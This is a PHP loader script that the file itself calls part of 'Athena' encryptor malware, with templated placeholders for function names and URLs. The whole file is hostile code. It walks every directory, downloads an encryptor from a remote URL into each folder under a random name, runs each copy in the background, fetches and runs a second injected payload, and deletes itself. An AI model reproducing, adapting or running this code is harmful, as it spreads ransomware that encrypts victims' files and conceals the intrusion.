<?php

/*
 * Loader from Athena encrytor malware
 * This file push encryptor on all other folder.
 * github: graniet
 */

$S = [];
define('_LNK_','{{URL_LNK}}');
define('_LNK_INJ_', '{{URL_INJ}}');

function {{FIRST_V}}($S_F = false)
{
    global $S;
    if($S_F == false)
        $S_F = getcwd();

    $LS = scandir($S_F);
    foreach($LS as $F)
    {
        if($F != '.' && $F != ".." && $F != ".DS_STORE" && !stristr($F, '.'))
            if(is_dir($S_F . '/' . $F)) {
                $S[] = $S_F . '/' . $F;
                {{FIRST_V}}($S_F . '/' . $F);
            }
    }
    if(!in_array($S_F, $S))
        $S[] = $S_F;
}

function {{SECOND_V}}($S)
{
    $C = file_get_contents(_LNK_);
    foreach ($S as $K => $FLD)
    {
        $R_S = substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(10/strlen($x)) )),1,10);
        $CPL = $FLD . '/' . $R_S . '.php';
        $NF = fopen($CPL, 'a+');
        fwrite($NF, $C);
        fclose($NF);
        if(file_exists($CPL))
            $S[$K] = $CPL;
    }
    foreach ($S as $FLNCH) {
        exec('php ' . $FLNCH . ' -d ' . implode('/', explode('/', $FLNCH, -1)) . ' >/dev/null 2>/dev/null &');
    }
    $I_J_F = file_get_contents(_LNK_INJ_);
    $N = substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(10/strlen($x)) )),1,10).'.php';
    $N_I_F = fopen($N, 'w');
    fwrite($N_I_F, $I_J_F);
    fclose($N_I_F);
    exec('php ' . $N . '.php >/dev/null 2>/dev/null &');
    @unlink(__FILE__);
}

{{FIRST_V}}();
{{SECOND_V}}($S);